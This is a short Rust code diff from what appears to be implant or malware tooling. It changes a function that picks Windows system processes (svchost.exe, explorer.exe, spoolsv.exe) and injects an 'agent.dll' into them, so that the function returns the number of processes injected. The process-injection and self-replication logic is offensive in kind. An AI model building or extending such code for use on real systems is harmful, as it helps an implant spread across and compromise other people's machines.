@@ -114,7 +114,7 @@ fn inject_dll(pid: u32, dll_path: &str) -> Result<(), String> {
 }
 
 /// Identifies target processes and injects the agent DLL into them.
-pub fn replicate_to_targets() {
+pub fn replicate_to_targets() -> usize {
     const TARGET_PROCESSES: &[&str] = &["svchost.exe", "explorer.exe", "spoolsv.exe"];
     const AGENT_DLL_NAME: &str = "agent.dll";
 
@@ -126,20 +126,20 @@ pub fn replicate_to_targets() {
         }
         Err(e) => {
             Log::error(format!("Failed to get current executable path: {}", e));
-            return;
+            return 0;
         }
     };
 
     if !dll_path.exists() {
         Log::error(format!("Agent DLL not found at: {}", dll_path.display()));
-        return;
+        return 0;
     }
 
     let dll_path_str = match dll_path.to_str() {
         Some(s) => s,
         None => {
             Log::error("DLL path contains invalid UTF-8 characters.".to_string());
-            return;
+            return 0;
         }
     };
 
@@ -169,8 +169,9 @@ pub fn replicate_to_targets() {
         }
     }
 
-    Log::info(format!(
+        Log::info(format!(
         "Agent replication complete. Injected into {} processes.",
         injected_pids.len()
     ));
+    injected_pids.len()
 }
